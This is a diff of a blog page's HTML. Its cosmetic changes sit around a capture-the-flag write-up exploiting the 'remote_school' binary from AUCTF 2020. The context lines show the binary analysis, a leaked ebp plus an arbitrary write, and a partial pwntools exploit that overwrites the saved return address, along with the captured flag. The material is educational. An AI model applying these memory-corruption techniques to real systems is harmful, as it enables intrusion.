@@ -68,9 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.129.0">
-        
-
+ <meta name="generator" content="Hugo 0.161.1">
         
 
         
@@ -113,15 +111,11 @@
                     
                         <ul class="nav navbar-nav navbar-right">
                             
-                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
-                            
                                 <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaeleflorio"><i class="fab fa-linkedin"></i></a></li>
-                            
-                                <li class="navbar-icon"><a href="https://twitter.com/raffaeleflorio_"><i class="fab fa-twitter"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="https://hackernoon.com/u/raffaeleflorio"><i class="fas fa-user-astronaut"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key.asc"><i class="fas fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fas fa-envelope"></i></a></li>
                             
@@ -160,13 +154,13 @@
 <p>Best, Dean of Eon Pillars</p>
 </blockquote>
 <p>You could download the binary <a href="/ctf/auctf2020/binary/remote_school">here</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum remote_school
 </span></span><span style="display:flex;"><span>d0639347713b54603db5f8015fc1015ca911fb10ad9d271c31e9630093054664  remote_school
 </span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>At the startup the program prints a banner and it asks a name. As usual I tried to find a buffer overflow or a format string vulnerability, without success.</p>
 <p>Then it prints a prompt. I also played a bit here, without success.</p>
 <p>However the program supports a lot of command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./remote_school
 </span></span><span style="display:flex;"><span>Welcome to your new online class!
 </span></span><span style="display:flex;"><span>We here, at Eon Pillars, we think Zoom is trash and prefer to have our lessions via command line!
 </span></span><span style="display:flex;"><span>May I get your name?
@@ -189,7 +183,7 @@
 </span></span><span style="display:flex;"><span>What should we <span style="color:#66d9ef">do</span>?
 </span></span><span style="display:flex;"><span>&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: 
 </span></span></code></pre></div><p>So I analyzed the binary with checksec. It has RWX segment and NX disabled. Weird.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec remote_school
 </span></span><span style="display:flex;"><span>    Arch:     i386-32-little
 </span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
 </span></span><span style="display:flex;"><span>    Stack:    No canary found
@@ -197,7 +191,7 @@
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
 </span></span></code></pre></div><p>Then I opened with radare2 and I found two promising functions:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ r2 -Ad ./remote_school
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ r2 -Ad ./remote_school
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>0x5655699f    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">120</span>          sym.class_hacker
@@ -205,7 +199,7 @@
 </span></span><span style="display:flex;"><span>.....
 </span></span></code></pre></div><p>But there isn’t any xref to both functions.</p>
 <p>However, after some digging, I found an interesting object:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span>   0x00002ec0 0x56558ec0 LOCAL  OBJ    <span style="color:#ae81ff">32</span>        classtable
 </span></span><span style="display:flex;"><span>.....
@@ -219,7 +213,7 @@
 </span></span><span style="display:flex;"><span>0x56558ed8 ..<span style="color:#f92672">[</span> null bytes <span style="color:#f92672">]</span>..   <span style="color:#ae81ff">00000000</span> 
 </span></span></code></pre></div><p>It seems like an associative array. So I tried to attend the “Hacker” class, with success.</p>
 <p>This class prints a hexadecimal value (maybe an address) and we got a segfault:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: attend Hacker
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: attend Hacker
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Welcome!
 </span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -229,7 +223,7 @@
 </span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>Let’s disassemble <code>class_hacker</code>.</p>
 <p>It’s a really simple function. It gets the input and then passes it to another function called <code>test</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.class_hacler
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.class_hacler
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>│           0x565569d2      <span style="color:#ae81ff">6800200000</span>     push 0x2000
 </span></span><span style="display:flex;"><span>│           0x565569d7      8d85f8dfffff   lea eax, <span style="color:#f92672">[</span>var_2008h<span style="color:#f92672">]</span>
@@ -244,7 +238,7 @@
 <li>It prints the address of <code>ebp</code>. I highlited the line with the THIS comment.</li>
 <li>It gives us an arbitrary write. I also highlited this line with a comment.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.test
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.test
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>|           0x56556559      e842fcffff     call sym.__x86.get_pc_thunk.bx
 </span></span><span style="display:flex;"><span>│           0x5655655e      81c3a22a0000   add ebx, 0x2aa2
@@ -265,7 +259,7 @@
 </span></span><span style="display:flex;"><span>.....
 </span></span></code></pre></div><p>So, with a two step attack, we can overwrite the saved return address (at <code>ebp + 0x4</code>) with the address of <code>print_flag</code>.</p>
 <p>This is the exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -311,7 +305,7 @@
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>interactive()
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
 </span></span></code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>auctf<span style="color:#f92672">{</span>1_hope_you_l1ked_my_g@m3_2321<span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>.....
@@ -400,9 +394,6 @@
 
 </div>
  
-    
-
-    
     
 
 </main>
